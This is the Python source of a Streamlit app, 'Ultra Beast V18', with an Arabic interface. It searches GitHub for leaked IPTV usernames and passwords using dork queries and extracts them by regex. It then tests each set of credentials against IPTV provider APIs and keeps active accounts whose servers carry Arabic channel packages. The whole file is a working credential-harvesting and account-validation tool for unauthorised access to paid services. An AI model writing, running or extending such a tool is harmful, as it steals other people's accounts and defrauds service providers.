import streamlit as st
import requests
import re
import time
import json
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime

# =================================================
# 1. إعدادات الأمان
# =================================================
LOGIN_PASSWORD = "BEAST_V18_ARABIC" 

def check_password():
    if "password_correct" not in st.session_state:
        st.session_state.password_correct = False
    if st.session_state.password_correct:
        return True

    st.markdown("<h2 style='text-align: center; color:#00ff41;'>🌪️ Ultra Beast V18 (ARABIC FILTER)</h2>", unsafe_allow_html=True)
    pwd = st.text_input("أدخل كلمة المرور الخاصة بالإصدار 18:", type="password")
    if st.button("دخول"):
        if pwd == LOGIN_PASSWORD:
            st.session_state.password_correct = True
            st.rerun()
        else:
            st.error("❌ خطأ!")
    return False

if not check_password():
    st.stop()

# =================================================
# 2. إعدادات الواجهة
# =================================================
st.set_page_config(page_title="Ultra Beast V18 AR", layout="wide")

st.markdown("""
<style>
    .stApp { background-color: #0c0e12; }
    .card {
        background: #14161a;
        border: 1px solid #2d323b;
        border-right: 5px solid #00ff41;
        padding: 15px;
        border-radius: 8px;
        margin-bottom: 10px;
    }
    .host-text { color: #00ff41; font-weight: bold; font-family: monospace; }
    .arabic-tag { background: #ff4b4b; color: #fff; padding: 2px 6px; border-radius: 4px; font-size: 11px; font-weight: bold; }
    .stats-tag { color: #888; font-size: 12px; }
</style>
""", unsafe_allow_html=True)

if 'results' not in st.session_state: st.session_state.results = []
if 'is_hunting' not in st.session_state: st.session_state.is_hunting = False
if 'checked_count' not in st.session_state: st.session_state.checked_count = 0
if 'seen_urls' not in st.session_state: st.session_state.seen_urls = set()

# =================================================
# 3. محرك الفحص الذكي (فلتر المحتوى العربي)
# =================================================

def check_arabic_content(host, user, pw):
    """يفحص إذا كان السيرفر يحتوي على محتوى عربي"""
    keywords = ["ARABIC", "BEIN", "OSN", "SSC", "MYHD", "SHAHID", "EBOX", "AL MAJD", "NILESAT"]
    try:
        # جلب تصنيفات القنوات الحية
        url = f"{host}/player_api.php?username={user}&password={p}&action=get_live_categories" # تم تعديل pw لـ p لاحقاً في الفحص
        res = requests.get(f"{host}/player_api.php?username={user}&password={pw}&action=get_live_categories", timeout=3).json()
        
        found_arabic = False
        cat_count = 0
        for cat in res:
            cat_name = cat.get('category_name', '').upper()
            if any(key in cat_name for key in keywords):
                found_arabic = True
                cat_count += 1
        
        return found_arabic, cat_count
    except:
        return False, 0

def get_country(host):
    try:
        ip = host.split('//')[-1].split(':')[0]
        res = requests.get(f"http://ip-api.com/json/{ip}", timeout=2).json()
        return res.get('country', 'Unknown')
    except: return "Global"

def check_account(host, user, pw, only_arabic):
    unique_key = f"{host}|{user}"
    if unique_key in st.session_state.seen_urls: return None
    st.session_state.seen_urls.add(unique_key)

    try:
        api_url = f"{host}/player_api.php?username={user}&password={pw}"
        r = requests.get(api_url, timeout=3).json()
        
        if r.get("user_info", {}).get("status") == "Active":
            is_arabic, arabic_cats = check_arabic_content(host, user, pw)
            
            # تطبيق الفلتر إذا تم تفعيله
            if only_arabic and not is_arabic:
                return None
            
            info = r["user_info"]
            exp = datetime.fromtimestamp(int(info['exp_date'])).strftime('%Y-%m-%d') if info.get('exp_date') else "Unlimited"
            country = get_country(host)
            m3u_link = f"{host}/get.php?username={user}&password={pw}&type=m3u_plus&output=ts"
            
            return {
                "host": host, "user": user, "pass": pw, 
                "exp": exp, "conn": f"{info.get('active_cons')}/{info.get('max_connections')}",
                "country": country, "m3u": m3u_link, "is_arabic": is_arabic, "arabic_cats": arabic_cats
            }
    except: return None

# =================================================
# 4. واجهة التحكم (Sidebar)
# =================================================
with st.sidebar:
    st.title("🌪️ BEAST V18 AR")
    token = st.text_input("GitHub Token:", type="password")
    
    st.divider()
    st.subheader("🛠️ إعدادات الفلتر")
    only_arabic = st.toggle("تفعيل الفلتر العربي فقط 🇪🇬🇸🇦", value=True)
    st.caption("عند التفعيل، سيتم تجاهل السيرفرات التي لا تحتوي على قنوات عربية.")
    
    st.divider()
    col1, col2 = st.columns(2)
    with col1:
        if st.button("🚀 ابدأ", use_container_width=True):
            if token: st.session_state.is_hunting = True
            else: st.warning("ضع التوكن!")
    with col2:
        if st.button("🛑 توقف", use_container_width=True):
            st.session_state.is_hunting = False

    st.metric("🔍 فحص", st.session_state.checked_count)
    st.metric("💎 صيد", len(st.session_state.results))
    
    if st.session_state.results:
        export_data = ""
        for item in st.session_state.results:
            export_data += f"ARABIC: {item['is_arabic']} | COUNTRY: {item['country']}\nHOST: {item['host']}\nUSER: {item['user']}\nPASS: {item['pass']}\nEXP: {item['exp']}\nM3U: {item['m3u']}\n" + "-"*30 + "\n"
        st.download_button("📥 تحميل النتائج", export_data, f"Arabic_Hunt_{datetime.now().day}.txt")

# =================================================
# 5. منطقة العرض المباشر
# =================================================
st.subheader("📡 الرادار المباشر (Filter: Arabic Content)")
results_area = st.empty()

def render_display():
    with results_area.container():
        for item in st.session_state.results:
            arabic_status = '<span class="arabic-tag">ARABIC ✅</span>' if item['is_arabic'] else ''
            st.markdown(f"""
            <div class="card">
                <div style="display:flex; justify-content:space-between; align-items:center;">
                    <span class="host-text">{item['host']}</span>
                    <div>{arabic_status} <span class="country-tag">🌍 {item['country']}</span></div>
                </div>
                <div style="margin-top:10px; font-size:14px; color:#ccc;">
                    <b>USER:</b> {item['user']} | <b>PASS:</b> {item['pass']} <br>
                    <b>EXP:</b> <span style="color:#ffa500;">{item['exp']}</span> | <b>CONN:</b> {item['conn']}
                </div>
                <div class="stats-tag">📊 تم العثور على {item['arabic_cats']} باقة عربية في هذا السيرفر.</div>
                <div style="background:#000; padding:5px; margin-top:5px; border-radius:4px; font-size:11px; color:#00ff41; overflow-x:auto;">
                    M3U: {item['m3u']}
                </div>
            </div>
            """, unsafe_allow_html=True)

if st.session_state.is_hunting:
    headers = {'Authorization': f'token {token}'}
    dorks = [
        'extension:txt "get.php?username=" "password=" ARABIC',
        'extension:txt "player_api.php" BEIN SSC',
        'filename:iptv.txt ARABIC',
        '"get.php?username=" OSN OSN'
    ]
    
    status_log = st.empty()
    for dork in dorks:
        if not st.session_state.is_hunting: break
        for page in range(1, 10):
            if not st.session_state.is_hunting: break
            status_log.info(f"🔎 فحص باقات عربية: {dork} | ص {page}")
            try:
                res = requests.get(f"https://api.github.com/search/code?q={dork}&page={page}", headers=headers).json()
                if 'items' in res:
                    for item in res['items']:
                        raw_url = item['html_url'].replace('github.com', 'raw.githubusercontent.com').replace('/blob/', '/')
                        content = requests.get(raw_url, timeout=3).text
                        matches = re.findall(r"(https?://[\w\.-]+(?::\d+)?)/[a-zA-Z\._-]+\?username=([\w\.-]+)&password=([\w\.-]+)", content)
                        for m in matches:
                            st.session_state.checked_count += 1
                            found = check_account(m[0], m[1], m[2], only_arabic)
                            if found:
                                st.session_state.results.insert(0, found)
                                st.toast(f"🎯 صيد عربي ثمين من {found['country']}!", icon="🔥")
                                render_display()
            except: continue
    st.session_state.is_hunting = False
    st.success("🏁 اكتملت دورة البحث العربية.")
else:
    render_display()